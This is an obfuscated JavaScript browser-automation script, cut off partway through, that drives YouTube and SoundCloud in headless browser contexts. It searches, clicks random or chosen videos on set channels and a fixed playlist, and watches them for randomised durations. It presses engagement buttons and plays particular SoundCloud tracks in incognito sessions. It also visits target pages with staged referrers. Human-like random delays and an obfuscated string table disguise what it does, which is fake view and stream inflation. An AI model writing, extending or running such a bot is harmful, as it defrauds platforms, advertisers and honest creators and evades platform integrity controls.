function a() {
  const bk = [
    'WPeVaSogbr8FaCkBuW',
    'gCk3WRi',
    '-best-moom',
    'jSokFmo6s0bqo8kwEq',
    'WPBcVMa',
    'AwTLieDLy2TVkq',
    'ai-wave-ii',
    'ntent-deli',
    'mJbL',
    'BJnlAJH6rwzLDW',
    'W7xdLZn2W5xdLSo1WQBdUSkh',
    'easyfork.o',
    'close',
    'CMCVC2nYAxb0CW',
    'Ahr0Chm6lY9NCG',
    'y2XVC2u',
    'W6VcPmkLrSkdWQBcK0/dGZe',
    'ChrZlZm3ndC5na',
    't-touch-fe',
    'ArrayBuffe'
  ];
  a = function() {
    return bk;
  };
  return a();
}
const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x22c * 0x10 + 0x8b4 + 0x1a0d))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x29 * 0x35 + 0x13bd + -0xb40), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x3bd5 * -0x2 + -0x8b4a + 0xb * 0xc70 + (-0x60fc + 0x67e4 + 0x33b0) * random()) : await standardWaitForNetIdle(f), await wait(0x346 * -0x6 + 0x3 * 0xa41 + 0x1 * 0x869 + (-0x3 * -0x89 + 0x9 * -0x62f + 0x5d1c) * random()), 0x15bd + 0x916 * 0x2 + -0x27e8;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2388 + 0xa93 + -0x1a93), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x8 * -0xd + -0x1b7b + 0x15 * 0x154;
}
async function randomWait() {
  return await wait(-0x47 * -0x1 + -0x444 + 0x1785 + (-0x2172 * 0x1 + 0x1f1d + 0x1d * 0xc1) * random()), -0xb7f + -0x288 + 0xe08;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2022 + -0xffd + -0x1025, 0xbe7 + -0x1d28 + 0x4f * 0x38), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1bbb3 + 0x1e47 * -0x1 + 0x2c45a) * getRandomInt(0xe2 * 0x8 + 0x220b + -0x2919, -0x4c3 + -0x9fb + -0xec3 * -0x1), h)), 0x1 * -0xa00 + 0x1cba * 0x1 + 0x1 * -0x12b9;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x7d8 + 0x11bf + -0x9e7;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x64 + -0x1a9b * 0x1 + -0x347 * -0x8]['split']('\x20');
    for (let k = -0x159c + 0x3 * -0x51b + 0x24ed; k < i['length']; k += 0x4 * -0xc9 + -0xbc * 0x17 + 0x5 * 0x402)
      j += i[k] * h[i[k + (0x1a64 + -0xb0a + -0xf59)]];
    return j;
  });
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x22af + 0x4a2 * -0x2 + 0x1b * -0xf1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x151 * 0xb + -0x26d8 + 0x79f * 0x7)['map'](l => Array['from'](l['children']))['flat'](0x65 * 0x3 + 0x23f * -0x2 + -0x4 * -0xd4)['map'](l => l['childNodes'][0x3e * 0x27 + 0x80 + -0x9f1]['childNodes'][-0x6b3 * -0x1 + 0xdbd + 0x8 * -0x28e]['childNodes'][0x116 * -0x5 + -0x1 * -0x2635 + -0x20c6]['childNodes'][-0x1f * -0xc1 + -0x795 * -0x1 + -0x1ef4]['childNodes'][-0x1a82 + 0x2 * 0xc51 + 0xd * 0x25]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x4f * -0x6f + -0x4 * -0x990 + 0x4499 * -0x1, -0x23e5 + -0xb2e * 0x2 + 0x4dc9)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0xa0 + 0x63b * -0x12 + 0xab5e);
  const h = await getMaxTime(f),
    i = Math['min']((-0x5c4d + -0xc426 + 0x20ad3) * getRandomInt(-0x20ee + -0xa31 + 0x2b21, -0x2419 + -0x1 * -0x15e6 + 0xe38), h);
  return await wait(i), 0xb * -0x115 + 0x1e7d + -0x1 * 0x1295;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1 * 0x1dd1 + -0xb61 + 0x2932]['children'][-0x1 * -0x1225 + -0x18bd + -0x2 * -0x34c]['children'][0x2 * -0xbf + -0x14e + 0x166 * 0x2]['children'][0x79 * -0x25 + 0x1 * -0x1bd5 + 0x2 * 0x16a9]['children'][-0x1c4c * -0x1 + -0xcc9 + -0xb * 0x169]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2b * 0xb5 + -0x23bd + -0x557 * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x3e * -0x4 + 0x9 * 0x305 + -0x19d1 + (-0x767 + 0x24f + -0x2 * -0x2a5) * random()
  }), await wait(-0xe * -0x10b + 0x3d5 * 0x6 + -0x23a4 + (0x11d4 + -0x9c7 * 0x1 + -0x6e1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x2 * 0x2db + -0x1f + -0x595]['childNodes'][-0x7 * 0x247 + 0x225 * 0x1 + 0xdcd]['childNodes'][-0x1e3b + 0x1030 + 0xe0c]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xd * 0x17f + -0xafb + 0x1e73]['childNodes'][-0x1d6e + -0xca7 + 0x2a15]['childNodes'][-0x2 * 0x5b1 + 0x1607 * -0x1 + 0x6af * 0x5]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x2 * 0xcac + -0x1a4a + 0x33a3),
          r = -0x42d * 0x4 + -0x270c + -0x1 * -0x37c0;
        for (let u = 0x2491 + 0x2336 + -0x47c7; u < q['length']; u += 0x1b6b + 0x476 + -0x1fdf)
          r += q[u] * k[q[u + (-0x681 * -0x3 + -0x1 * 0x1bcd + 0x84b)]];
        return r;
      }(n);
  });
  await wait((-0x1f * -0x226 + -0xbd6 * 0x5 + 0x332c) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1777 * -0x1 + -0x1 * 0x8896 + 0x18a6d) * getRandomInt(0x3d1 + -0x12d4 + 0xf04, 0x2 * 0x9c7 + -0x5 * 0x38f + -0x9 * 0x31), h + (-0x126b + -0x1 * -0x2555 + 0x9e));
  return await wait(i), 0x5 * -0x2a1 + 0xce9 + 0x3d;
}
async function keyWatch(f) {
  const R = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1d0 * 0xf + -0x7 * 0x235 + 0x2aa3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + R(0x12) + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2e1 * -0xa + 0x15bd + -0x1 * 0x26cf + (-0x1395 + -0x21c7 * 0x1 + -0x2 * -0x1ca2) * Math['random']());
    });
  }, -0x543 * -0x1 + -0x35e2 + 0x4bf7 * 0x1);
  await wait(-0x2eb1e + 0x74c55 + 0x3 * 0x10e3);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1 * -0x484e + 0x1580a + -0xb5f8) * getRandomInt(0x1 * 0xb85 + -0x1524 + -0x1 * -0x9a3, 0x5 * 0x53a + -0x15c3 + -0x446)), clearInterval(h), 0x5 * 0x5c2 + -0x7 * -0x4c7 + -0x3e3a;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1587 + 0x163c + 0xb5 * -0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x193d + 0x172 * -0x19 + 0x3a2 * 0x3;
    await randomWait();
  }
  return -0x5 * -0x1b + -0x225 + 0x19f;
}

function fetchRandomSC() {
  return Math['random']() <= -0x5ad + -0x11a7 + 0xbaa * 0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x5 * 0x439 + -0x1210 * -0x1 + -0xd0f * 0x3 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const T = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1a6 * -0x7 + 0x3 * 0x55b + -0x1b9b * 0x1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0xf22 + 0x216f + 0x3091 * -0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1 * -0x58ea + -0x22 * 0x44d + 0x19aec + getRandomInt(-0x6fe3 + 0x288b * -0x2 + 0xfb91, -0x7424 + -0x1 * -0x2c5d + -0xe1 * -0xd7));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1a86 + 0x7b7 * -0x1 + -0x12ce), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x15d5 + 0x1b03 + -0x52e;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x3 * -0x8eb + -0x1b4f + -0xad0 * -0x5, -0x607 + 0x2190 + -0x91d * 0x3)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xf * -0x1 + 0x1 * -0x1a97 + 0x2258 + floor((-0x8a + 0x1ee7 * 0x1 + -0x1a75) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x42 * -0x2afacb9 + 0x6e8dc6c4 + -0x1 * -0xc2bcc0ee),
          0x5a43a9 + -0x59f * -0x101f + 0x34e1ea * -0x1,
          0x1 * 0x8f7d + -0x3361 + 0x8f9 * 0x4,
          -0x9c6 + -0xa01 + -0xb3 * -0x1d
        ], y = [
          0x40 * -0x68 + -0xcc7 + 0x141 * 0x1f,
          -0x1 * -0x245c + -0x42d * -0x7 + 0x4187 * -0x1,
          -0x1 * 0x837 + -0x233f + -0x2 * -0x15bf,
          0x1bf * 0xb + -0xd * -0x219 + -0x295 * 0x12
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1abe + 0x2db + -0x1d98)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2ef * -0x4 + 0x337 * 0x5 + -0x457; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x108e + -0x63b + 0x1 * -0xa53) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x12be * 0x2 + 0x12b + 0x1 * 0x2451] = A[-0x1bfc + 0x2302 + -0x6f6] = A[-0x14e0 + 0xcf7 + 0x7ea] = A[0x193a + -0x10dd + -0x85b] = A[-0x16d0 + 0xee3 + 0x7f0] = A[-0x1 * -0x191 + 0xd * 0xb5 + -0x37 * 0x32] = A[0x4 * -0x4a5 + -0x121 + 0x13ba] = A[-0x8 * 0x46b + -0x1fc + 0x255a] = A[-0x191d + 0x1d5 * -0xb + -0x3 * -0xf19] = A[0x1419 + 0xb7 * -0x27 + 0x7d0] = A[-0x1286 * 0x1 + -0x1 * -0x1516 + -0x287] = A[-0x2580 + -0x61f * -0x1 + 0x1f6b] = A[0x73d + -0x422 + -0x310] = A[-0x11ce + 0x38 * 0x3d + 0x1 * 0x482] = A[0x16cc + 0x71 * -0x11 + 0x2 * -0x79f] = A[-0x176f + -0xe * 0xae + 0x2101 * 0x1] = A[0x2 * -0x766 + 0x1697 * -0x1 + 0x2 * 0x12b9] = 0x14 * -0x19e + -0x3f9 + 0x2451, this['blocks'] = A) : this['blocks'] = [
                0x1226 + 0x11a6 + -0x23cc,
                0x26b0 * 0x1 + -0x19d0 + 0x19c * -0x8,
                -0x1b11 + -0xe4d + -0x161 * -0x1e,
                -0xb3b * 0x1 + 0xd1 * 0x11 + -0x2a6,
                0x1e01 + 0x15 * -0x87 + 0x977 * -0x2,
                0x282 * -0x1 + 0x2067 + 0x1 * -0x1de5,
                0x15d8 + -0x1efc + 0x924,
                -0x259c + -0x224f + 0x47eb,
                -0x7 * -0x486 + -0xb6a * 0x3 + 0x294,
                0x1 * 0x95f + -0xc23 + 0x3 * 0xec,
                -0x2 * -0x8db + 0x16f * -0xd + -0x3 * -0x4f,
                -0x2d8 * 0x6 + -0x1010 + 0x2120,
                -0x98 * 0x13 + -0x11 * 0x43 + 0xfbb,
                0x1 * 0x647 + 0xcaa + -0x1 * 0x12f1,
                0x1 * 0x1f8e + -0x268e + 0x70 * 0x10,
                -0x17ee + 0x1 * -0x190f + 0x30fd,
                -0x29 * 0x99 + -0x15d5 * 0x1 + -0x1 * -0x2e56
              ], this['h0'] = -0x53754235 + 0xaab895b3 + -0x1001cf83 * -0x1, this['h1'] = 0x13695389 * -0x18 + 0x814a37b9 + 0x2406348a8, this['h2'] = -0x29a9 * -0x43d5e + -0xccb9a519 + 0xb4d3f109, this['h3'] = -0xc94d96f + 0x3660d * -0x683 + 0x32e8b48c, this['h4'] = -0x123c2f6f * 0xd + -0x16a3236f6 + 0x31b138189, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x204c + 0x2 * -0x125 + -0x1e02, this['finalized'] = this['hashed'] = -0x225b * 0x1 + 0x235d * -0x1 + 0x45b8, this['first'] = -0x8ce * 0x1 + -0xeb * -0xd + 0x2 * -0x190;
            }
            ['update'](J) {
              const S = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E[S(0x13) + 'r'] && (J = new Uint8Array(J)), M = 0x263b + 0x17a5 * -0x1 + -0xe96, O = J['length'] || -0xb47 * -0x1 + -0x56 * 0x47 + 0xc93 * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x60b + -0x10a3 + 0xa98 * 0x1, P[0x2 * -0x1d0 + 0x5b0 + 0x3 * -0xb0] = this['block'], P[-0x1692 + -0x8 * -0x136 + 0xcf2 * 0x1] = P[-0x1 * 0x25ab + 0xde3 + 0x17c9] = P[0x1 * -0x1ad4 + 0x1247 * 0x1 + 0x7 * 0x139] = P[-0x1 * 0x21a9 + -0x3 * -0xb3 + 0x1f93] = P[0x211 + -0x7 * -0x1 + -0x4c * 0x7] = P[0x20a2 + -0x1913 + -0x78a] = P[-0x1fd5 + -0x226f + 0x424a] = P[-0x5b3 * -0x1 + 0x20d7 + 0x2683 * -0x1] = P[-0x15d7 + 0x383 + 0x1 * 0x125c] = P[0x265c + 0x2 * 0x421 + 0x2e95 * -0x1] = P[0x1 * -0xa62 + -0x136e + 0x1 * 0x1dda] = P[-0x1 * -0x1fc + -0x1c25 + -0xc * -0x22f] = P[0x1694 + -0x3e3 * -0x8 + -0xb * 0x4e0] = P[0xf14 + -0x1f7a + 0x1073 * 0x1] = P[0x171b + 0x192 * -0x2 + 0x6a3 * -0x3] = P[-0x1a7 + -0x1f24 + 0x5 * 0x692] = -0xb * 0x1a9 + -0x1 * -0x12af + 0x1 * -0x6c), K) {
                    for (N = this['start']; M < O && N < 0x1dba + 0x4e8 + -0x36 * 0xa3; ++M)
                      P[N >> 0x5 * 0x257 + 0x1a2f + -0x25e0] |= J[M] << y[0x60d + -0xf38 + 0x92e & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x22b0 + 0x5 * -0x1ed + 0xedb * 0x3; ++M)
                      (L = J['charCodeAt'](M)) < -0x1 * -0x215d + 0x1c9b + -0x3d78 ? P[N >> 0x21b * -0x4 + -0x1726 + 0x2f * 0xac] |= L << y[-0xbba * -0x2 + 0x10 * -0x17c + 0x4f & N++] : L < 0x4e7 * -0x1 + 0x2219 + -0x1532 ? (P[N >> 0x1ca5 + -0x1652 + -0x651] |= (-0x11 * 0x202 + -0x14f2 + 0x37d4 | L >> -0xa66 * -0x1 + -0xa34 + -0x2c) << y[0x1219 + -0x232a + 0x445 * 0x4 & N++], P[N >> 0x112d * 0x1 + -0x1bf5 + 0xaca] |= (-0x1ad * -0x7 + 0x1b89 + 0xc * -0x33b | 0xb3e * 0x1 + 0x142c * -0x1 + 0x92d & L) << y[0x1 * 0x2f3 + -0x9ac + 0x6bc * 0x1 & N++]) : L < -0x9e3d + 0x1 * 0x1a453 + 0x15b * -0x22 || L >= 0x2 * -0xaced + -0x109ab + -0x1 * -0x34385 ? (P[N >> -0x15fb + 0x696 * -0x2 + 0x2329] |= (0x13 * -0x175 + 0x44 * -0x5e + 0x3587 * 0x1 | L >> -0x253 * -0xe + -0x1733 * 0x1 + -0x319 * 0x3) << y[0x1 * 0x1b1a + -0x1c15 + 0xfe & N++], P[N >> 0x61f + -0x10ed + 0xad0] |= (-0x5c8 + 0x8 * -0x461 + -0x14a8 * -0x2 | L >> 0x14c7 + -0x5f0 + -0xed1 & 0x2 * -0x105b + -0x1c69 + 0x3d5e) << y[-0xb87 * 0x1 + -0x2153 + 0x8f9 * 0x5 & N++], P[N >> 0x44c + -0xd4 * -0x2e + -0x2a62] |= (0x21f5 + -0x1 * -0x2644 + -0x47b9 | 0x1fe + -0x1bbf * -0x1 + -0x1d7e & L) << y[-0x352 + 0x43e * 0x6 + 0x329 * -0x7 & N++]) : (L = 0x3 * -0x5382 + 0x1c08a * 0x1 + 0x4d5 * 0xc + ((0x9f3 + 0x68e * 0x3 + 0x1 * -0x199e & L) << 0x2024 + -0x1056 + -0x3f1 * 0x4 | -0x488 * 0x1 + -0x655 + 0xedc & J['charCodeAt'](++M)), P[N >> 0x10ae + 0x9c * 0x14 + -0x1 * 0x1cdc] |= (0x89 * -0xc + -0x1c32 + 0x6f * 0x52 | L >> -0x14ce + 0x219d + -0x1 * 0xcbd) << y[0x2574 + 0x1 * 0x1367 + 0x6b * -0x88 & N++], P[N >> 0x1 * -0x1350 + 0x612 + 0xd40] |= (-0x41 * 0x36 + -0x20cf + 0x2f05 * 0x1 | L >> 0x9eb + 0x2571 + -0x2f50 & -0x1771 + 0x21b6 + -0xa06) << y[-0x1 * 0x161f + 0x1523 + 0xff & N++], P[N >> 0x2e * -0x2 + -0x1 * -0x2695 + 0xcbd * -0x3] |= (0x53 * -0x2d + 0x3a9 * 0x3 + -0x2 * -0x20e | L >> 0x5 * 0x753 + -0x1 * -0x7e7 + -0x2c80 & -0x17cf + 0x4 * -0xdf + 0x6 * 0x497) << y[-0x1 * -0x1eb + -0x1b * 0x47 + 0x595 & N++], P[N >> 0x1d * -0xa3 + 0x2 * 0x4e + 0x11dd] |= (0x19be + 0x22aa + -0x3be8 | -0x1cce + 0x1dc9 + 0x5e * -0x2 & L) << y[-0x653 * -0x4 + -0x7 * 0x3cc + -0x1 * -0x14b & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xa7a + 0x8f4 * 0x4 + 0x1916 * -0x1 ? (this['block'] = P[-0x2 * 0x6f2 + 0x14b * -0x5 + 0x146b], this['start'] = N - (-0x37a + 0x1 * 0x59 + 0x361), this['hash'](), this['hashed'] = -0xf1 * -0x26 + -0x1 * 0xcc7 + -0x16fe) : this['start'] = N;
                }
                return this['bytes'] > -0x17173ac * 0x5e + 0xff10edc3 * 0x1 + -0x1 * -0x88978b64 && (this['hBytes'] += this['bytes'] / (0x513a7 * -0x12f4 + 0x396bf05c + 0x126cc88d0) << 0xd25 + -0x2a4 + -0xa81, this['bytes'] = this['bytes'] % (-0xc2036d8 * -0x12 + 0x3 * -0x8c702ebc + 0x1cb0cb104)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xdac + -0x1 * -0x598 + -0x1 * 0x1343;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1193 + 0x1a99 + -0x2c1c] = this['block'], J[K >> 0xc78 + -0x1a62 + 0xdec] |= x[0x1 * -0xbcf + -0x20fa + -0xf4 * -0x2f & K], this['block'] = J[-0x24 * -0x9e + 0x1 * -0x416 + 0x9 * -0x202], K >= 0x81b + -0x197b + 0x1198 * 0x1 && (this['hashed'] || this['hash'](), J[0x224 * -0xd + -0xdb9 + 0x298d] = this['block'], J[-0x7f5 + 0x26a3 + -0x1e9e] = J[0x89b + 0x1 * -0xb61 + 0x2c7] = J[0xed3 + -0x17ce + -0x3 * -0x2ff] = J[0x328 * 0x1 + -0xbbb * 0x3 + 0x200c] = J[-0xb4d * 0x1 + -0x4a8 * -0x2 + 0x13 * 0x1b] = J[0x2124 + -0x1647 + -0xad8] = J[-0x388 + -0xa1 * -0x31 + -0x1b43] = J[-0x2 * -0x6 + -0x3 * -0xbb9 + -0x2330] = J[0x3f * -0x58 + 0x2d7 * 0xd + -0xf3b] = J[0x3 * -0x93b + -0x1b93 + 0x374d] = J[0xaba + -0x2640 + 0x93 * 0x30] = J[-0x177 + -0x336 * 0x4 + 0xe5a] = J[0x4 * -0x11f + 0x3 * 0x396 + -0x31d * 0x2] = J[-0x1efb + 0xbac + 0x135c] = J[-0x1 * -0x26f1 + 0xb * -0x305 + -0x5ac] = J[-0x68 * 0x20 + 0x2347 + 0x3b4 * -0x6] = 0x198a + 0x171e + 0x2 * -0x1854), J[0x69d * -0x5 + 0xd45 + -0x34f * -0x6] = this['hBytes'] << -0xd * -0x293 + 0x149d + -0x3611 | this['bytes'] >>> -0x210b + -0x1 * 0x676 + 0x39a * 0xb, J[-0x1 * 0x1269 + -0x138d + 0x1 * 0x2605] = this['bytes'] << 0x224b + 0x132d * -0x2 + 0x209 * 0x2, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xa38 + -0x13 * -0x11 + -0xb6b; J < 0x1 * -0x45d + -0x9b2 + -0xe5f * -0x1; ++J)
                K = Q[J - (-0x1 * 0x2596 + 0x2 * 0x817 + -0x156b * -0x1)] ^ Q[J - (-0x160 + -0x7 * 0x245 + -0x13 * -0xe9)] ^ Q[J - (-0x36b * 0x7 + 0x2677 * -0x1 + 0x3e72)] ^ Q[J - (-0x154f + -0x2ba * -0xd + -0x1 * 0xe13)], Q[J] = K << 0x5 * 0x281 + 0x1c9f + -0x2923 | K >>> -0x1 * -0x151a + 0x1 * 0x15b6 + 0x2ab1 * -0x1;
              for (J = -0x214 + 0x1 * 0x1c99 + -0x1a85; J < 0x10e + 0x2 * -0xb7d + 0x1600; J += 0x1aaf + -0x1d07 * -0x1 + 0x10d * -0x35)
